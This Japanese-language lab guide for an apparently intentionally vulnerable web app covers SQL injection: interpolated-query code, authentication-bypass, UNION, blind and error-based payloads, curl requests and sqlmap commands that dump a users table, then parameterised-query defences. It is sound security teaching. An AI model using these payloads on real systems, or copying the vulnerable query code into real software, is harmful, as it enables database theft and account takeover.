# SQLインジェクション脆弱性

## 📋 概要

SQLインジェクションは、攻撃者がアプリケーションのデータベースクエリに悪意のあるSQLコードを挿入できる脆弱性です。OWASP Top 10の第3位にランクされる重大な脆弱性です。

## 🎯 学習目標

- SQLインジェクションの仕組みを理解する
- 様々な攻撃手法を実践する
- 脆弱性を検出する方法を学ぶ
- 適切な対策を実装する

## 🔍 脆弱なコードの場所

### 1. 認証バイパス（auth.js）

**脆弱なコード:**

```javascript
// src/routes/auth.js - ログインエンドポイント
const query = `SELECT * FROM users WHERE username = '${username}'`;
```

**攻撃例:**

```bash
# ユーザー名に以下を入力
username: admin' OR '1'='1
password: anything

# 実行されるSQL
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

**結果:** パスワードなしでログイン可能

### 2. ユーザー登録での権限昇格

**脆弱なコード:**

```javascript
const insertQuery = `
    INSERT INTO users (username, email, password, role) 
    VALUES ('${username}', '${email}', '${hashedPassword}', '${userRole}')
`;
```

**攻撃例:**

```bash
POST /api/auth/register
{
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "password123",
    "role": "admin"  # 管理者権限を自分で設定
}
```

### 3. パスワードリセット

**脆弱なコード:**

```javascript
const updateQuery = `UPDATE users SET password = '${hashedPassword}' WHERE username = '${username}'`;
```

**攻撃例:**

```bash
POST /api/auth/reset-password
{
    "username": "admin' OR '1'='1",
    "newPassword": "hacked123"
}

# すべてのユーザーのパスワードが変更される
```

## 🛠️ 攻撃手法

### 1. 認証バイパス

```sql
-- 常に真となる条件を追加
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin'--
admin' #
```

### 2. UNION ベースの攻撃

```sql
-- 他のテーブルからデータを取得
' UNION SELECT id, username, password, email, role, NULL, NULL FROM users--

-- システム情報の取得
' UNION SELECT NULL, version(), current_database(), current_user(), NULL, NULL, NULL--
```

### 3. ブラインドSQLインジェクション

```sql
-- 真偽値ベース
' AND (SELECT COUNT(*) FROM users) > 0--
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--

-- 時間ベース
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

### 4. エラーベースの攻撃

```sql
-- エラーメッセージから情報を抽出
' AND 1=CAST((SELECT version()) AS int)--
' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--
```

### 5. ストアドプロシージャの悪用

```sql
-- データベースに定義された脆弱な関数を利用
'; SELECT * FROM search_users('admin'' OR ''1''=''1')--
```

## 🔬 テスト手順

### 手動テスト

1. **基本的なテスト**

```bash
# シングルクォートのテスト
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\''", "password": "test"}'

# エラーメッセージを確認
```

1. **認証バイパステスト**

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' OR '\''1'\''='\''1", "password": "anything"}'
```

1. **UNION攻撃テスト**

```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' UNION SELECT id, username, password, email, role, NULL, NULL FROM users--", "password": "test"}'
```

### SQLMapを使用した自動テスト

1. **基本スキャン**

```bash
sqlmap -u "http://localhost:3000/api/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --headers="Content-Type: application/json" \
  --level=5 \
  --risk=3
```

1. **データベース列挙**

```bash
sqlmap -u "http://localhost:3000/api/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  --dbs
```

1. **テーブル列挙**

```bash
sqlmap -u "http://localhost:3000/api/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  -D vulnerable_app \
  --tables
```

1. **データダンプ**

```bash
sqlmap -u "http://localhost:3000/api/auth/login" \
  --data='{"username":"test","password":"test"}' \
  --method=POST \
  -D vulnerable_app \
  -T users \
  --dump
```

### Burp Suiteを使用したテスト

1. Burp Suiteのプロキシを起動
2. ブラウザのプロキシ設定を変更
3. ログインリクエストをインターセプト
4. Repeaterに送信
5. usernameパラメータを変更してテスト
6. Intruderで自動化

## 🛡️ 対策方法

### 1. パラメータ化クエリ（推奨）

**安全なコード:**

```javascript
// プリペアドステートメントを使用
const query = 'SELECT * FROM users WHERE username = $1';
const result = await executeQuery(query, [username]);
```

### 2. ORMの使用

```javascript
// Sequelize の例
const user = await User.findOne({
    where: { username: username }
});
```

### 3. 入力検証

```javascript
// ホワイトリスト方式
const isValidUsername = /^[a-zA-Z0-9_]{3,20}$/.test(username);
if (!isValidUsername) {
    return res.status(400).json({ error: 'Invalid username format' });
}
```

### 4. エスケープ処理

```javascript
// pg-format を使用
const format = require('pg-format');
const query = format('SELECT * FROM users WHERE username = %L', username);
```

### 5. 最小権限の原則

```sql
-- データベースユーザーの権限を制限
REVOKE ALL ON ALL TABLES IN SCHEMA public FROM app_user;
GRANT SELECT, INSERT, UPDATE ON users TO app_user;
-- DELETE権限は付与しない
```

## 📊 影響度評価

| 項目 | 評価 |
|------|------|
| **CVSS スコア** | 9.8 (Critical) |
| **機密性への影響** | High - すべてのデータが漏洩する可能性 |
| **完全性への影響** | High - データの改ざんが可能 |
| **可用性への影響** | High - データベースの削除が可能 |
| **攻撃の複雑さ** | Low - 簡単に実行可能 |
| **必要な権限** | None - 認証不要 |

## 🎓 学習課題

### 初級

1. [ ] 基本的なSQLインジェクションを実行してログインをバイパスする
2. [ ] エラーメッセージからデータベース情報を取得する
3. [ ] UNION攻撃でユーザーテーブルの内容を取得する

### 中級

4. [ ] ブラインドSQLインジェクションでadminのパスワードを1文字ずつ取得する
2. [ ] 時間ベースのブラインドSQLインジェクションを実行する
3. [ ] SQLMapを使用して自動的に脆弱性を検出する

### 上級

7. [ ] ストアドプロシージャの脆弱性を悪用する
2. [ ] セカンドオーダーSQLインジェクションを実行する
3. [ ] WAFをバイパスする手法を試す

## 📚 参考資料

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://github.com/sqlmapproject/sqlmap/wiki)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

## ⚠️ 注意事項

- このドキュメントは教育目的のみで作成されています
- 許可されていないシステムに対してSQLインジェクション攻撃を実行しないでください
- 実際の脆弱性を発見した場合は、責任を持って開示してください
